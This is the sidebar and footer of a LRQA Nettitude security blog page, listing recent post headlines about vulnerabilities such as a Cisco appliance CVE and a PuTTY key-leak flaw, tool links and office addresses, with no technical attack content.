EC2 Data\n\nOctober 9, 2019\n\n  * CVE-2024-20356: Jailbreaking a Cisco appliance to run DOOM\n\nApril 18, 2024\n\n  * Introducing the MLCommons AI Safety v0.5 Proof of Concept\n\nApril 18, 2024\n\n  * Flaw in PuTTY P-521 ECDSA signature generation leaks SSH private keys\n\nApril 16, 2024\n\nTweets by Nettitude_Labs\n\n#### Useful Links\n\nDownload PoshC2 Vulnerability Research LRQA Nettitude Cyber Security Tools Red\nTeam Training Careers at LRQA Nettitude\n\n#### Presented By\n\n#### UK\n\n1 Trinity Park Bickenhill Lane Birmingham B37 7ES\n\n#### Europe\n\nFidiou 9 Athens 106 78\n\n#### Americas\n\n810 Seventh Avenue Suite 1110 New York NY 10019\n\n#### Asia\n\n460 Alexandra Rd, #15-01 mTower Singapore 119963\n\nCONTACT US\n\n\u00a9 Copyright LRQA Nettitude\n\nTwitterYouTubeLinkedIn\n\nGo to Top\n\n", "frontpage": false}
